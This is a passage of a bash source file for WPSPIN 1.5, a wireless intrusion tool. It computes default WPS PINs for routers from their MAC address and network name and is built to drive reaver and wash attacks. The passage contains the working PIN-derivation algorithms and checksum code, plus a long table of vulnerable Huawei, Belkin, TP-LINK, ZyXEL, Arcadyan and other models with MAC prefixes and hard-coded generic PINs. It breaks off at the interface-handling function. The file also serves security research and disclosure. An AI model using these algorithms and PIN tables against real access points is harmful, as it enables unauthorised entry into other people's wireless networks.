#!/bin/bash

#################################################### LEGAL ADVISORY ####################################################################3

# This scripts is edited under the General Public License version 3 as defined by the Free software foundation. 
# This package is distributed in the hope that it will be useful, but without any warranty; It can be used and modified and shared but should be referenced to, it CANNOT be 
# sold or be used for a commercial-economical purpose.
# See the details in the file LICENSE.txt that is situated in the folder of the script or visit http://gplv3.fsf.org/ ) 
  


##################################################### ABOUT WPSPIN + CREDITS #################################################################3



#The first version was released in crack-wifi.com, lampiweb.com and auditoriaswireless.net the 8th December 2012
#It was published to reveal the results of my studies about Huawei HG 532s from ISP FTE (orange - Spanish branch)
#I found the way to derivate the default WPSPIN from bssid and essid 
#Surprisingly a variant of the same algorithm ( but just based ) on the mac address worked on belkin device and another huawei router
#I thought I found another algorithm, but i realized that it had been parallely and previously by zhaochunsheng in a C. script named computepinC83A35
#( http://gjkiss.info/2012/04/get-the-pin-in-router-mac-address-start-with-c83a35-00b00c-081075 )
#Later i integrated arcadyan easybox PIN generation has revealed by Stefan Viehböck ( https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130805-0_Vodafone_EasyBox_Default_WPS_PIN_Vulnerability_v10.txt )
#and the WPA key generation for the same device thanks to a full disclosure of Stefan wottan ( http://www.wotan.cc/?p=6 )
#finally i used VodafoneXXXX Arcadyan Essid  by coeman76 that unifies both and correct errors from original codes

#Everything was adapted to bash from the scratch thanks to the collaboration of antares_145, r00tnuLL and 1camaron1, thanks to them billion a billion time :)

#It would't have been possible neither without my beloved lampiweb.com work crew, maripuri, bentosouto, dirneet, betis-jesus, compota, errboricobueno, pinty_102 and all users 
#greetings to crack-wifi.com family, yasmine, M1ck3y, spawn, goliate, fuji, antares has been already credited, koala, noireaude, vances1, konik etc... and all users
#greetings to auditoriaswireless.net and thanks to the big chief papones for the hosting and greetings to everybody
#This code uses wps reaver that has to be installed on it own, reaver is a free software (http://code.google.com/p/reaver-wps/) (GPL2) by Tactical Network Solutions. Thanks to 
#them for this amazing work (especially Craig Heffner ) 
#You also need aircrack-ng, thanks to Mister X and kevin devine for providing the best suite ever (http://www.aircrack-ng.org/)
#Developed for debian based system such as Ubuntu, xubuntu, linux mint... and especially kali linux, thanks to offensive security for theirs work and special greetings to g0tmi1k







#####################################################     CHANGELOG      ########################################################################3



# 1.1 (10-12-2012)
#	- Support for PIN beginning with one or several 0 thanks to the data of atim and tresal. 
#	- New MAC supported : 6A:C0:6F (HG566 default ESSID vodafoneXXXX )
# 1.2 (12/12/2012)
#	- Fixed output bugs in backtrack and other distributions
#	- Added support to the generic default PIN known
# 1.3 (23/01/2013)
#	- New supported devices:
#		- 7 bSSID vodafoneXXXX (HG566a) > 6A:3D:FF / 6A:A8:E4 / 6A:C0:6F / 6A:D1:67 / 72:A8:E4 / 72:3D:FF / 72:53:D4
#		- 2 bSSID WLAN_XXXX (PDG-A4001N de adbroadband) > 74:88:8B / A4:52:6F
#		- 2 new models affected:
#			1) SWL (Samsung Wireless Link), default ESSID SEC_ LinkShare_XXXXXX.  2 known affected BSSID > 80:1F:02 / E4:7C:F9
#			2) Conceptronic  c300brs4a  (default ESSID C300BRS4A ) 1 BSSID known  > 00:22:F7   
#	- Rules to check the validity of the mac address (thanks r00tnuLL and anteres_145 for your codes) 
#	- More filter for some case where several default ssid are possible,check the difference between ssid and bssid for FTE for possibles mismatch...
#       - More information displayed when a target is selected
#	- Display and colours problems are definitively solved for all distributions, one version
#	- Rewriting of code (tanks to r00tnuLL, antares_145, goyfilms and 1camron1 for their advices and feed back)
# 1.4 ( 22/05/2013)
#      - Complete Rewriting of code to provide new functions:
#          - Multi language         
#          - A automated mode using wash and reaver 
#          - Interfaces management (automatic if only one interface is present, acting as filter if no mode monitor is possible to reduce options) 
#          - New supported bssid
#              -  2 news bssid for FTE-XXXX (HG532c)   34:6B:D3 and F8:3D:FF 
#              -  17 new bssid for vodafone HG566a
#               62:23:3D 62:3C:E4 62:3D:FF 62:55:9C 62:7D:5E 62:B6:86 62:C7:14 6A:23:3D 6A:3D:FF 6A:7D:5E 6A:C6:1F 6A:D1:5E 72:3D:FF 72:53:D4 72:55:9C 72:6B:D3  72:A8:E4  
#          - New supported devices ( 9 models )    
#              -  TP-LINK  >  TD-W8961ND v2.1 default SSID TP-LINK_XXXXXX  3 known bssids ; F8:D1:11 B0:48:7A 64:70:02
#              -  EDIMAX  >  3G-6200n and EDIMAX  >  3G-6210n    bssid ; 00:1F:1F defaukt SSID : default
#              -  KOZUMI >  K1500 and   K1550  bssid : 00:26:CE 
#              -  Zyxel  >  P-870HNU-51B      bssid : FC:F5:28
#              -  TP-LINK  TP-LINK_XXXXXX  TL-WA7510N    bssid : 90:F6:52:
#              -  SAGEM FAST 1704 > SAGEM_XXXX    bssid :  7C:D3:4C:
#              -  Bewan iBox V1.0 > one bssid   00:0C:C3  for two ssids with different defaukt PIN   >   DartyBox_XXX_X and TELE2BOX_XXXX
# 1.5 ( 24/01/2014 )
#
#        - Imlemented bash adaptation of esay box arcadyan vodane PIN and WPA algorithm by coeman76
#        - Grafic changes and code optimization
#        - New filters for preventing permissions issues, directory issues, unisntalled tools isuues, interfaces issues
#        - Fixed the bug for FTE red  
#        - New option to define a sequence of PIN to try first ( thanks to Spawn for recursive_generator )
#        - New option to enter manually a different PIN then than one proposed
#        - -p option with reaver is not used any longuer due to lost of quality of attack and PIN are genrated live
#        - detection of processing error to backup the sesssion untill the PIN that could create a problem in order to avoid the "99,99% bug"
#        - function to adapt mode monitor managment with RT 3XXX chipsets
#        - Default WPA key is shown once target has been selected if the algorithm for default wpa is known ( still a lot to implement )
#        - prevent reaver failure when saving a sesssion
#        - bash adaptation of arcadyan easy box WPA and PIN generator by coeman76
#        - display the progress of a former sesssion before attacking the target again
#        - option to allow the user to customize the reaver command line 
#        - New supported bssid
#             - modification for 08863B with new devices, repeater N300 Dual-Band Wi-Fi Range Extender no compatible, with AP rate limit
#             - new bssid  F81A67 for TD-W8961ND with AP RATE LIMIT
#             - new vodafone-XXXX BSSID = 6296BF 6ACBA8 62:CB:A8 72:CB:A8.... 
#             - new bssid for PDG4100ND D0:D4:12 with refereed PIN 88202907  
#          - New supported devices
#             - NEW DEVICES, D-LINK, DSL-2730U (bssid = B8A386 | B8A386) & DSL-2750U C8:D3:A3 , with respectively generic PIN 20172527 &  #21464065
#             - NEW DEVICE, ZTE ; ZXHN_H108N , default generic 12345670 bssids: F8:1B:FA & F8:ED:80 default ssid = MOVISTAR_XXXX 
#             - 08:7A:4C E8:CD:2D 0C:96:BF NEW DEVICE   Orange-XXXX / HG530s ( Huawei )  
#             - E4:C1:46 for MOVISTAR_XXXX. Model : Observa Telecom - RTA01N_Fase2 comercialized by Objetivos y Servicios de Valor  
#             - new TP-LINK device affected TD-W8951ND with AP RATE LIMIT and known bssid A0:F3:C1:
#             - the last Bbox, with default ssid Bbox-XXXXXXXX, manufactures by SAMSUNG is vulnerable , known BSSID = 5C:A3:9D DC:71:44 D8:6C:E9
#             - VodafoneXXXX New device for mac 1C:C6:3C 50:7E:5D 74:31:70 84:9C:A6 88:03:55 full disclosure aracadyan PIN-WPA model : ARV7510PW22
#             - HG 532e from djibouti, default ssid HG532e-XXXXXX , mac  EC:23:3D
#             - DG950A from Arris Interactive  L.L.C, mac 00:1D:CF, default SSID ARRIS-XXXX 
#             - CDE-30364 from Hiltron - used by spanish ISP OnO with default ssid OnOXXX0 - mac : BC1401 68B6CF 00265B






#####################################  STARTING WPSPIN        #############################################################33
#########################################################################################################################33







##################################### GLOBAL VARIABLES

printf '\033[8;37;80t'                # we define a format for the shell, very close to the default one in many distributions

colorbase="\033[0;37m"                   
#colorbase="\E[0m"                      # We define the colors as variables to avoid problems of output from one distribution to the other 
REALORANGE="\033[1;43m"
negro="\033[0;30m"
verde="\033[0;32m"
orange="\033[0;33m"
azul="\033[0;34m"
kindofviolet="\033[0;35m"
gris="\033[1;30m"
rojo="\033[1;31m"
verdefluo="\033[1;32m"
amarillo="\033[1;33m"
azullight="\033[1;34m"
magenta="\033[1;35m"
azulfluo="\033[1;36m"
blanco="\033[1;37m"
rougesombre="\033[2;31m"
vertmoyen="\033[2;32m"
caki="\033[2;33m"
bleuconde="\033[2;34m"
violet="\033[2;35m"


###############################          FUNCTIONS          ###########################################################################################

###############################  FIRST THE ONE THAT ARE COMMON TO EVERY LANGUAGE (NO DISPLAY INVOLVED) ##################################################

##############################  I    > GENERATE - TO ATTRIBUTE PIN AND DATA TO AP
############################### II   > CHECKSUM (by antares_145 ) - CALCULATE THE WPS CHECKSUM
############################### III  > ZAOMODE - APPLYING THE SAME ALGORITHM THAN ZHAOCHUNSHENG IN COMPUTEPIN
############################### IV   > IFACE - MANAGE INTERFACES FOR WIRELESS INTRUSION AND LIMIT USER TO SHORT MENU IF NO INTERFACE IS AVAILABLE
############################### V    > IFACE_SELECTION - FOR SELECTING THE INTERFACE IF SEVERAL ARE AVAILABLE
############################### VI   > WASH_SCAN - LAUNCH WPS SCANNING REORGANIZING THE OUTPUT DISPLAY (use wash form reaver)
############################### VII  > REAVER_CHECK - CONTROL IF REAVER IS INSTALLED (ALSO CHECK IF WASH OR WALSH IS USED)
############################### VIII > BIG_MENUE - WPSPIN WITH ALL FEATURES  
############################### IX   > CLEAN - REMOVE TMP FILES AND UNSET THE VARIABLES
###############################  X   > recursive_generator( by spawn from crack-wifi.com, thank you ;) ) - STRING GENERATOR
############################### XI   > BASICPINGENERATOR - GENERATE A BASIC PIN DICTIONARY
############################### XII  > WPCGENERATOR - GENERATE A WPC FILE  
############################### XIII > PRIMARY_CHECK - CHECK ROOT PRIVILEGE AND LOCATION
############################### XIV  > REGENERATE - TO RE-GENERATE A WPC FILE
############################### XV   > ATTACK_ATTACK - ACTIVATE REAVER AND MANAGE ATTACK LOG
############################### XVI  > ARACDYAN - GENERATE PIN AND DEFAULT PASSWORD FOR RACADYAN DEVICE(*)
#(*) # This function uses three amazing works
#   1) easybox_keygen.sh (c) 2012 GPLv3 by Stefan Wotan and Sebastian Petters from www.wotan.cc 
#   2) easybox_wps.py by Stefan Viehböck http://seclists.org/fulldisclosure/2013/Aug/51
#   3) Vodafone-XXXX Arcadyan Essid,PIN WPS and WPA Key Generator by Coeman76 from lampiweb team
# Thank you guys! 

###################   GENERATE ######################################################################################################################################
################################################## the core of script, attribute a default PIN to the routers 

###### VARIABLES CODIFIED          ACTIVATED >  1 = YES  0 = NO       APRATE > 1 = YES  0 = NO    SPECIAL > 1 = SEVERAL MODEL WITH THIS BSSID       ############################
###############################    UNKNOWN   >  0 = SUPPORTED      1 = YES     2 = NOT SUPPORTED 




GENERATE(){                                                                  # this functions will attribute a default PIN number according to the bssid and in some cases bssid 
                                                                             # and essid, we need at least to have defined a variable BSSID (the mac address of the objective

DEFAULTWPA=""
APRATE=0
UNKNOWN=0                                                                    # By default routers are  marked as supported with 0, when there are not this value will be changed
SPECIAL=0
FABRICANTE=""
MODEL=""
DEFAULTSSID=""
CHECKBSSID=$(echo $BSSID | cut -d ":" -f1,2,3 | tr -d ':')                   # we take pout the 6 first half of the mac address (to identify the devices=  
FINBSSID=$(echo $BSSID | cut -d ':' -f4,5,6)                                 # we keep the other half to generate the PIN
MAC=$(echo $FINBSSID | tr -d ':')                                            # taking away the ":" 
CONVERTEDMAC=$(printf '%d\n' 0x$MAC) 2> /dev/null                                        # conversion to decimal







########################################   SUPPORTED DEVICES ###############################################################################################3



case $CHECKBSSID in                                                          # we will check the beginning of the mac to identify the AP


04C06F | 202BC1 | 285FDB | 346BD3 | 80B686 | 84A8E4 | B4749F | BC7670 | CC96A0 | F83DFF)    # For FTE-XXXX (HG552c), original algorithm by kcdtv  
FINESSID=$(echo $ESSID | cut -d '-' -f2)                                     # We take the identifier of the essid with cut
PAREMAC=$(echo $FINBSSID | cut -d ':' -f1 | tr -d ':')                       # we take digit 7 and 8 of the mac address
CHECKMAC=$(echo $FINBSSID | cut -d ':' -f2- | tr -d ':')                     # we isolate the digits 9 to 12 to check the conformity of the default difference BSSID - ESSID
if [[ $ESSID =~ ^FTE-[[:xdigit:]]{4}[[:blank:]]*$ ]] &&   [[ $(printf '%d\n' 0x$CHECKMAC) = `expr $(printf '%d\n' 0x$FINESSID) '+' 7` || $(printf '%d\n' 0x$FINESSID) = `expr $(printf '%d\n' 0x$CHECKMAC) '+' 1` || $(printf '%d\n' 0x$FINESSID) = `expr $(printf '%d\n' 0x$CHECKMAC) '+' 7` ]];  
       
then
MACESSID=$(echo $PAREMAC$FINESSID)                                           # this is the string used 7 and 8 digits mac + 4 last digits essid FTE-XXXX 
PRESTRING=`expr $(printf '%d\n' 0x$MACESSID) '+' 7`                             # we had 7 to the string

STRING=`expr '(' $PRESTRING '%' 10000000 ')' `

CHECKSUM

  else                                                                       # if essid is not the default one we will generate the three possible PIN according to the mac 
  STRING=`expr '(' $CONVERTEDMAC '%' 10000000 ')' '+' 8`                     # mac + 8 converted to decimal = our PIN2

  CHECKSUM

  PIN2=$PIN
  STRING=`expr '(' $CONVERTEDMAC '%' 10000000 ')' '+' 14`                    # mac + 14 converted to decimal = our PIN3

  CHECKSUM

  PIN3=$PIN                                           

  ZAOMODE                                                                    # PIN number one we use the first algorithm, end mac converted to decimal 

  CHECKSUM

fi

FABRICANTE="HUAWEI"                             ##### FTE-XXXX HUAWEI HG532c Echo Life  > algorithm kcdtv
DEFAULTSSID="FTE-XXXX"
MODEL="HG532c Echo Life"
ACTIVATED=1


;;
C8D15E )

FABRICANTE="HUAWEI"                             ##### Jazztel_XX HUAWEI HG532c Echo Life  > algorithm kcdtv
DEFAULTSSID="Jazztel_XX "
MODEL="HG532c Echo Life"
ACTIVATED=1



;;
001915 )                                        ##### WLAN-XXXX TECOM  AW4062   > generic 12345670

PIN=12345670

FABRICANTE="TECOM Co., Ltd."
DEFAULTSSID="WLAN_XXXX"
MODEL="AW4062"
ACTIVATED=0                                    # 0 is given to the routers that does not't have WPS enabled


;;
F43E61 | 001FA4)                               ####### WLAN_XXXX  OEM Shenzhen Gongjin Electronics   Encore ENDSL-4R5G   > Generic 12345670

PIN=12345670

FABRICANTE="Shenzhen Gongjin Electronics Co., Ltd"
DEFAULTSSID="WLAN_XXXX"
MODEL="Encore ENDSL-4R5G"
ACTIVATED=1                                    # 1 and the wps is activated



;;
404A03)                                      ######## WLAN_XXXX P-870HW-51A V2  ZYXELL    > Generic 11866428

PIN=11866428

FABRICANTE="ZyXEL Communications Corporation"
DEFAULTSSID="WLAN_XXXX"
MODEL="P-870HW-51A V2"
ACTIVATED=1

;;
001A2B)                                     ######## WLAN_XXXX Gigabyte 802.11n by Comtrend      >Generic 88478760 

PIN=88478760                                # comtrend has others models with this mac for the moment we will give this PIN for all devices warning the user 
PIN2=77775078
FABRICANTE="Ayecom Technology Co., Ltd."
DEFAULTSSID="WLAN_XXXX"
MODEL="Comtrend Gigabit 802.11n"
ACTIVATED=1
SPECIAL=1                                           # 2 when different models with different PIN have the same start of bssid

;;
3872C0)                                   # ######## JAZZTEL_XXXX AR-5387un  Comtrend   > Generic 18836486 20172527

PIN=18836486                              # same story, some of this range mac address are used by Telefonica (WLAN_XXXX) in this case there is not even wps, we let it this way
PIN2=20172527

FABRICANTE="Ayecom Technology Co., Ltd."
DEFAULTSSID="JAZZTEL_XXXX"
MODEL="Comtrend AR-5387un"
ACTIVATED=0
            

;;
FCF528)                                   ######### WLAN_XXXX P-870HNU-51B by ZYXELL  > Generic 20329761

PIN=20329761                           

FABRICANTE="ZyXEL Communications Corporation"
DEFAULTSSID="WLAN_XXXX"
MODEL="P-870HNU-51B"
ACTIVATED=1
APRATE=1

;;
3039F2)                          ############# PIN WLAN_XXXX PDG-A4001N by ADB-Broadband > multiples generic PIN
PIN=16538061
PIN2=16702738
PIN3=18355604
PIN4=88202907
PIN5=73767053
PIN6=43297917
PIN7=19756967
PIN8=13409708
FABRICANTE="ADB-Broadband"
DEFAULTSSID="WLAN_XXXX"
MODEL="PDG-A4001N"
ACTIVATED=1


;;
74888B)                   ############# PIN WLAN_XXXX PDG-A4001N by ADB-Broadband > multiples generic PIN
PIN=43297917
PIN2=73767053
PIN3=88202907
PIN4=16538061
PIN5=16702738
PIN6=18355604
PIN7=19756967
PIN8=13409708
FABRICANTE="ADB-Broadband"
DEFAULTSSID="WLAN_XXXX"
MODEL="PDG-A4001N"
ACTIVATED=1


;;
A4526F)                  ############# PIN WLAN_XXXX PDG-A4001N by ADB-Broadband > multiples generic PIN
PIN=16538061
PIN2=88202907
PIN3=73767053 
PIN4=16702738
PIN5=43297917
PIN6=18355604
PIN7=19756967
PIN8=13409708
FABRICANTE="ADB-Broadband"
DEFAULTSSID="WLAN_XXXX"
MODEL="PDG-A4001N"
ACTIVATED=1
 
;;
DC0B1A)                   ############# PIN WLAN_XXXX PDG-A4001N by ADB-Broadband > multiples generic PIN
PIN=16538061
PIN2=16702738
PIN3=18355604
PIN4=88202907
PIN5=73767053
PIN6=43297917
PIN7=19756967
PIN8=13409708
FABRICANTE="ADB-Broadband"
DEFAULTSSID="WLAN_XXXX"
MODEL="PDG-A4001N"
ACTIVATED=1


;;
D0D412)                  ############# PIN WLAN_XXXX PDG-A4001N by ADB-Broadband > multiples generic PIN
PIN4=16538061
PIN2=16702738
PIN3=18355604
PIN=88202907
PIN5=73767053
PIN6=43297917
PIN7=19756967
PIN8=13409708
FABRICANTE="ADB-Broadband"
DEFAULTSSID="WLAN_XXXX"
MODEL="PDG-A4001N"
ACTIVATED=1


;;
5C4CA9 | 62233D | 623CE4 | 623DFF | 62559C | 627D5E | 6296BF | 62A8E4 | 62B686 | 62C06F | 62C61F | 62C714 | 62CBA8 | 62E87B | 6A1D67 | 6A233D | 6A3DFF | 6A53D4 | 6A559C | 6A6BD3 | 6A7D5E | 6AA8E4 | 6AC06F | 6AC61F | 6AC714 | 6ACBA8 | 6AD15E | 6AD167 | 723DFF | 7253D4 | 72559C | 726BD3 | 727D5E | 7296BF | 72A8E4 | 72C06F | 72C714 | 72CBA8 | 72D15E | 72E87B )   

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="HUAWEI"         ############# HUAWEI HG 566a vodafoneXXXX > Pin algo zao
DEFAULTSSID="vodafoneXXXX"
MODEL="HG 566a"
ACTIVATED=1

;;
002275)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Belkin"         ############# Belkin Belkin_N+_XXXXXX  F5D8235-4 v 1000  > Pin algo zao
DEFAULTSSID="Belkin_N+_XXXXXX"
MODEL="F5D8235-4 v 1000"
ACTIVATED=1

;;
08863B)

if [[ -n `(echo "$ESSID" | grep -E '_xt' )` ]];

  then 
UNKNOWN=2
FABRICANTE="Belkin"
DEFAULTSSID="XX...-xt"
MODEL="N300 Dual-Band Wi-Fi Range Extender"
ACTIVATED=1
APRATE=1
 else

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Belkin"         ############# Belkin belkin. F5D8235-4 v 1000  > Pin algo zao # update: several models share this bssid
DEFAULTSSID="belkin.XXX"
MODEL="F9K1104(N900 DB Wireless N+ Router)"
ACTIVATED=1
SPECIAL=1

fi

;;
001CDF)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Belkin"         ############# Belkin belkin. F5D8235-4 v 1000  > Pin algo zao
DEFAULTSSID="belkin.XXX"
MODEL="F5D8235-4 v 1000"
ACTIVATED=1

;;
00A026)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Teldat"         ############# Teldat WLAN_XXXX iRouter1104-W  > Pin algo zao
DEFAULTSSID="WLAN_XXXX"
MODEL="iRouter1104-W"
ACTIVATED=1


;;
5057F0)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="ZyXEL Communications Corporation"         ############# Zyxel ZyXEL zyxel NBG-419n  > Pin algo zao
DEFAULTSSID="ZyXEL"
MODEL="zyxel NBG-419n"
ACTIVATED=1


;;
C83A35 | 00B00C | 081075)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Tenda"         ############# Tenda W309R  > Pin algo zao, original router that was used by ZaoChusheng to reveal the security breach
DEFAULTSSID="cf. computepinC83A35"
MODEL="W309R"
ACTIVATED=1

;;
E47CF9 | 801F02)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="SAMSUNG"         ############# SAMSUNG   SEC_ LinkShare_XXXXXX  SWL (Samsung Wireless Link)  > Pin algo zao
DEFAULTSSID="SEC_ LinkShare_XXXXXX"
MODEL="SWL (Samsung Wireless Link)"
ACTIVATED=1

;;
0022F7)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Conceptronic"         ############# CONCEPTRONIC   C300BRS4A  c300brs4a  > Pin algo zao
DEFAULTSSID="C300BRS4A"
MODEL="c300brs4a"
ACTIVATED=1

       
;;                                 ########### NEW DEVICES SUPPORTED FOR VERSION 1.5 XD
F81A67 | F8D111 | B0487A | 647002 )              

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="TP-LINK"             ######## TP-LINK_XXXXXX  TP-LINK  TD-W8961ND v2.1   > Pin algo zao
DEFAULTSSID="TP-LINK_XXXXXX"
MODEL="TD-W8961ND v2.1"
ACTIVATED=1
APRATE=1


;;
001F1F)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="EDIMAX"              ########## EDIMAX 3G-6200n "Default"   > PIN ZAO
DEFAULTSSID="Default"
MODEL="3G-6200n"
ACTIVATED=1


;;
001F1F)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="EDIMAX"              ########## EDIMAX 3G-6200n/3G-6210n "Default"   > PIN ZAO
DEFAULTSSID="Default"
MODEL="3G-6200n & 3G-6210n"
ACTIVATED=1

;;
0026CE)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="KUZOMI"              ########## KUZOMI K1500 & K1550 "Default"   > PIN ZAO
DEFAULTSSID="Default"
MODEL="K1500 & K1550"
ACTIVATED=1


;;
90F652)

PIN=12345670

FABRICANTE="TP-LINK"            ########## TP-LINK  TP-LINK_XXXXXX  TL-WA7510N  > PIN   generic 12345670
DEFAULTSSID="TP-LINK_XXXXXX"
MODEL="TL-WA7510N"
ACTIVATED=1


;;
7CD34C)                        ########### SAGEM FAST 1704    > PIN GENERIC 43944552

PIN=43944552

FABRICANTE="SAGEM"
DEFAULTSSID="SAGEM_XXXX"
MODEL="fast 1704"
ACTIVATED=1


;;
000CC3)                               ########### BEWAN, two default ssid abd two default PIN ELE2BOX_XXXX > 47392717   Darty box ; 12345670

if [[ $ESSID =~ ^TELE2BOX_[[:xdigit:]]{4}[[:blank:]]*$ ]]; then

FABRICANTE="BEWAN"
DEFAULTSSID="TELE2BOX_XXXX"
MODEL="Bewan iBox V1.0"
ACTIVATED=1
APRATE=1
PIN=47392717


elif  [[ $ESSID =~ ^DartyBox_[[:xdigit:]]{3}_[[:xdigit:]]{1}*$ ]]; then


FABRICANTE="BEWAN"
DEFAULTSSID="DartyBox_XXX_X"
MODEL="Bewan iBox V1.0"
ACTIVATED=1
PIN=12345670

else

FABRICANTE="BEWAN"
DEFAULTSSID="TELE2BOX_XXXX / DartyBox_XXX_X"
MODEL="Bewan iBox V1.0"
ACTIVATED=1
APRATE=1
PIN=47392717
PIN2=12345670

fi


;;
A0F3C1)

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="TP-LINK"             ######## TP-LINK_XXXXXX  TP-LINK TD-W8951ND   > Pin algo zao
DEFAULTSSID=$(echo "TP-LINK_XXXX(XX)")
MODEL="TD-W8951ND"
ACTIVATED=1
SPECIAL=1



;;
5CA39D | DC7144 | D86CE9)              # Bbox with Essid Bbox-XXXXXXXX, algo zao, no limits by samsung

ZAOMODE                                                                                        
CHECKSUM


FABRICANTE="Samsung"
ACTIVATED=1
DEFAULTSSID="Bbox-XXXXXXXX"
MODEL="Bbox by Samsung"
ACTIVATED=1



;;
B8A386)          # D-Link DSL-2730U con PIN generico 20172527

DEFAULTSSID="Dlink_XXXX"
FABRICANTE="D-Link"
MODEL="D-Link DSL-2730U"
ACTIVATED=1
PIN=20172527


;;
C8D3A3)                  # D-Link DSL-2750U con PIN generico 21464065   

DEFAULTSSID="Dlink_XXXX"
FABRICANTE="D-Link"
MODEL="D-Link DSL-2750U"
ACTIVATED=1
PIN=21464065


;;
F81BFA | F8ED80)        # ZTE -  ZXHN_H108N  pin generico 12345670

DEFAULTSSID="MOVISTAR_XXXX"
FABRICANTE="ZTE"
MODEL="ZXHN_H108N"
ACTIVATED=1
PIN=12345670


;;
E4C146)               # Observa Telecom - Router ADSL (RTA01N_Fase2)

if [ -n "`(echo $ESSID | grep -F MOVISTAR)`" ] ; then

DEFAULTSSID="MOVISTAR_XXXX"
FABRICANTE="Observa Telecom para Objetivos y Servicios de Valor"
MODEL="RTA01N_Fase2"
ACTIVATED=0
PIN=71537573

elif [ -n "`(echo $ESSID | grep -F Vodafone)`" ] ; then

UNKNOWN=2

DEFAULTSSID="VodafoneXXXX"
FABRICANTE="Objetivos y Servicios de Valor"
MODEL="Unknown"
ACTIVATED=1
APRATE=1

else

DEFAULTSSID="MOVISTAR_XXXX or VodafoneXXXX"
FABRICANTE="Objetivos y Servicios de Valor"
MODEL="Unknown"
ACTIVATED=1
SPECIAL=1
PIN=71537573

fi


;;
087A4C | 0C96BF | E8CD2D )

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="HUAWEI"                             ##### HUAWEI HG532s de Orange (españa) 
DEFAULTSSID="Orange-XXXX"
MODEL="HG532s"
ACTIVATED=1

;;
1CC63C | 507E5D | 743170 | 849CA6 | 880355)   # original algorithms by Stefan Wotan-Stefan Viehböck-Coeman76 

FABRICANTE="Arcadyan Technology Corporation"
MODEL="ARV7510PW22"
ACTIVATED=1

if [ -n "`(echo $ESSID | grep -F Vodafone)`" ] ; then

DEFAULTSSID="VodafoneXXXX"
ARCADYAN
CHECKSUM

elif [ -n "`(echo $ESSID | grep -F Orange)`" ] ; then

UNKNOWN=2


else

DEFAULTSSID="VodafoneXXXX ?"
ARCADYAN
CHECKSUM

SPECIAL=1

fi



;;
EC233D )

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="HUAWEI"                             ##### HUAWEI HG532e de Djinouti 
DEFAULTSSID="HG532e-XXXXXX"
MODEL="HG532e"
ACTIVATED=1





;;
001DCF )                                      ##### DG950A from Arris Interactive  L.L.C

PIN=12345670

FABRICANTE="Arris Interactive  L.L.C"                            
DEFAULTSSID="ARRIS-XXXX"
MODEL="DG950A"
ACTIVATED=1




;;
BC1401 | 68B6CF | 00265B )                                      ##### Router Hiltron CDE-30364 (used by spanish ISP OnO )

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="Hitron Technologies"                            
DEFAULTSSID="ONOXXX0"
MODEL="CDE-30364"
ACTIVATED=0


;;
CC5D4E )                                      ##### Router WAP 3205 by zyxell

ZAOMODE                                                                                        
CHECKSUM

FABRICANTE="zyxell"                            
DEFAULTSSID="ZyXEL"
MODEL="WAP 3205"
ACTIVATED=1


############################################################ UNSUPPORTED DEVICES #############################################################



;;
C03F0E | A021B7 | 2CB05D | C43DC7 | 841B5E | 008EF2 | 744401 | 30469A | 204E7F )  # unsupported ono netgear cg3100d, 


FABRICANTE="Netgear"
DEFAULTSSID="ONOXXXX"
MODEL="CG3100D"
ACTIVATED=0

UNKNOWN=2

##########################################################  THE REST; UNKNOWN DEVICE #############################################################

;;
*)                        # for everything else, the first algorithm by zhaochunsheng  
if  [[ $ESSID =~ ^DartyBox_[[:xdigit:]]{3}_[[:xdigit:]]{1}*$ ]]; then  # case of the darty box that can broadcast bssid without any relation to the device real mac


FABRICANTE="BEWAN"
DEFAULTSSID="DartyBox_XXX_X"
MODEL="Bewan iBox V1.0"
ACTIVATED=1
PIN=12345670

else
ZAOMODE                                                                   
CHECKSUM                                                                     

UNKNOWN=1                 # this value 1 will identify the routers has unknown


fi
;;
esac
}



################################################################################################ END GENERATE ################ FOR attributing the default PIN #################
#####################################################################################################









CHECKSUM(){                                                                  # The function checksum was written for bash by antares_145 form crack-wifi.com
PIN=`expr 10 '*' $STRING`                                                    # We will have to define first the string $STRING (the 7 first number of the WPS PIN)
ACCUM=0                                                                      # to get a result using this function)
                                                             
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10000000 ')' '%' 10 ')'`       # multiplying the first number by 3, the second by 1, the third by 3 etc....
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 1000000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 100000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 10000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 1000 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 1 '*' '(' '(' $PIN '/' 100 ')' '%' 10 ')'`
ACCUM=`expr $ACCUM '+' 3 '*' '(' '(' $PIN '/' 10 ')' '%' 10 ')'`             # so we follow the pattern for our seven number

DIGIT=`expr $ACCUM '%' 10`                                                   # we define our digit control: the sum reduced with base 10 to the unit number
CHECKSUM=`expr '(' 10 '-' $DIGIT ')' '%' 10`                                 # the checksum is equal to " 10 minus  digit control "

PIN=$(printf '%08d\n' `expr $PIN '+' $CHECKSUM`)                             # Some zero-padding in case that the value of the PIN is under 10000000   
}                                                                            # STRING + CHECKSUM gives the full WPS PIN




ZAOMODE(){                                                                   # this is the string (half mac converted to decimal) used in the algorithm originally discovered by
STRING=`expr '(' $CONVERTEDMAC '%' 10000000 ')'`                             # zhaochunsheng in ComputePIN                                            
}




IFACE(){                                                                     # For reaver and wash/walsh  we will need a mode monitor interface so this functions will deal
                                                                             #with the task to assign one, that will be declared as MON_ATTACK

